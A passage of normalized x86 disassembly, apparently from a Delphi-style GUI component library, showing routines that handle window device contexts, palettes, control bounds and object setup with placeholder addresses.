pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44eed0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_419c08
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44ef80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419c6c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_44ef59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44f10c
call sub_404f70
call sub_404f70
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419898
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_4255ac
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44ef8c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_419c08
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44f02a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f031
mov eax [ rw-data ]
call sub_419c6c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_44f002
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44f10c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425608
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419898
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4255ac
test al al
je r-xdata
sub_44f038
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_44f10c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4251cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_44f064
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_425798
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_42579c
mov eax [ ebp - 0x4 ]
call sub_44f158
mov eax [ rw-data ]
call sub_419c08
mov ebx eax
xor eax eax
push ebp
push sub_44f0e9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_419740
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419c6c
retn
call sub_44eed0
sub_44f10c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_42579c
mov edx ebx
mov eax [ rw-data ]
call sub_419c1c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_44f158
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_450f68
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_44f184
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_44f1c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_419f24
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_44f208
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_44f2c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f391
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f398
lea eax [ ebp - 0x1c ]
call sub_405530
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_40484c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x84 ]
call sub_433b40
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_40af98
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_405584
sub_44f3b4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44f41b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44a500
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_450894
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov edx [ eax + 0x64 ]
pop eax
call sub_405974
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f422
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov al 0x1
sub_44f43c
push ebx
mov ebx eax
mov eax ebx
call sub_44a528
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f484
push ebx
mov ebx eax
mov eax ebx
call sub_44a578
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x84 ]
call sub_405974
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f4bc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404800
mov eax [ eax + 0xa4 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x80 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44f4fc
push ebx
mov ebx eax
mov eax ebx
call sub_44a5b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f530
push ebx
mov ebx eax
mov eax ebx
call sub_4208d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x110 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f558
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4508c4
sub_44f57c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_44f5a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x84
mov edx esi
call sub_405584
sub_44f5c4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4507b4
sub_44f5e4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x110 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x114 ] edx
sub_44f610
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x160 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x15c ]
call sub_405974
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
movzx eax [ edi + 0x70 ]
cmp al [ esi + 0x158 ]
je r-xdata
mov al 0x1
sub_44f678
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_450190
sub_44f698
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45017c
sub_44f6b8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x158 ] bl
sub_44f6d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_450848
sub_44f6fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x78 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424528
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_450944
movzx eax [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f184
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_451908
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45dcac
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4533e0
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x8e ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7e ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xac ] eax
mov [ ebx + 0x158 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_44f7f4
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_404a1c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_44525c
mov eax [ edi + 0x94 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4049c4
mov edx edi
call sub_4202d8
push edi
mov eax [ edi + 0x94 ]
xor ecx ecx
mov edx 0xb039
call sub_451b4c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov edx esp
mov eax edi
call sub_4501b4
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_40484c
xor eax eax
mov [ edi + 0x94 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_404650
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_404650
mov eax [ edi + 0x68 ]
call sub_404650
mov eax [ edi + 0x64 ]
call sub_40ab08
mov eax [ edi + 0x78 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420010
test bl bl
jle r-xdata
sub_44f8d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_44f900
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov edi eax
xor ebx ebx
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffd7
call sub_40484c
mov ebp eax
test ebp ebp
je r-xdata
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
movzx eax [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push ebp
push esi
call SelectPalette
mov ebp eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push ebp
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_44f98c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx eax [ esp ]
cmp al [ esi + 0x61 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx ebx [ esi + 0x61 ]
movzx eax [ esp ]
mov [ esi + 0x61 ] al
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
mov eax esi
call sub_44fda0
movzx eax [ r-xdata ]
cmp al [ esi + 0x61 ]
jne r-xdata
mov eax [ esi + 0x180 ]
cmp eax [ esi + 0x40 ]
jne r-xdata
mov eax [ esi + 0x188 ]
push eax
mov eax [ esi + 0x18c ]
push eax
mov ecx [ esi + 0x184 ]
mov edx [ esi + 0x180 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax [ esi + 0x184 ]
cmp eax [ esi + 0x44 ]
jne r-xdata
mov eax [ esi + 0x188 ]
cmp eax [ esi + 0x48 ]
jne r-xdata
mov eax [ esi + 0x18c ]
cmp eax [ esi + 0x4c ]
je r-xdata
sub_44fa2c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_404650
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_452f0c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40484c
mov edx ebx
mov eax edi
call sub_420098
mov eax ebx
mov si 0xffd9
call sub_40484c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_44fac0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xf7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_450cec
sub_44fb2c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_42043c
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_451b4c
sub_44fbc0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4202f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x80 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_450848
jmp r-xdata
cmp edi [ esi + 0x94 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44fa2c
jmp r-xdata
xor eax eax
mov [ esi + 0x94 ] eax
sub_44fc18
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
movzx eax [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
movzx eax bl
movzx edx [ eax + rw-data ]
mov eax edi
call sub_44f98c
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
movzx eax [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
cmp [ esp ] 0x0
je r-xdata
movzx eax [ esp ]
test al al
je r-xdata
mov eax edi
mov si 0xffee
call sub_40484c
test bl bl
jne r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x188 ]
push eax
mov eax [ edi + 0x18c ]
push eax
mov ecx [ edi + 0x184 ]
mov edx [ edi + 0x180 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax ebx
test al al
je r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_44fd00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_452590
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_450cec
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44fda0
mov eax ebx
call sub_45342c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_451b4c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_40484c
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_44fda0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x164 ] 0x0
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx ebx [ esi + 0x61 ]
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
add edi eax
push edi
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add edi eax
mov eax edi
lea ecx [ esp + 0x4 ]
pop edx
call sub_418420
mov eax [ esp ]
mov [ esi + 0x16d ] eax
mov eax [ esp + 0x4 ]
mov [ esi + 0x171 ] eax
movzx eax [ r-xdata ]
cmp al bl
jne r-xdata
adc eax 0x0
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x175 ] eax
xor eax eax
mov [ esi + 0x179 ] eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add edi eax
mov [ esi + 0x165 ] edi
adc eax 0x0
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x165 ] eax
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x165 ] eax
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add ebx eax
mov [ esi + 0x169 ] ebx
adc eax 0x0
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x169 ] eax
jmp r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x169 ] eax
jmp r-xdata
lea ecx [ esi + 0x175 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
sub_44ff24
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x1
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov [ ebx + 0x180 ] eax
sub_44ff58
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx edx
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x2
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x44 ]
mov [ ebx + 0x184 ] eax
sub_44ff8c
push ebx
push esi
mov ebx eax
push edx
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x4
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x188 ] eax
sub_44ffc0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
push edx
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x8
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x18c ] eax
sub_44fff4
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp edi [ eax + 0x94 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_450114
push [ fs : edx ]
mov [ fs : edx ] esp
cmp edi 0xffffffff
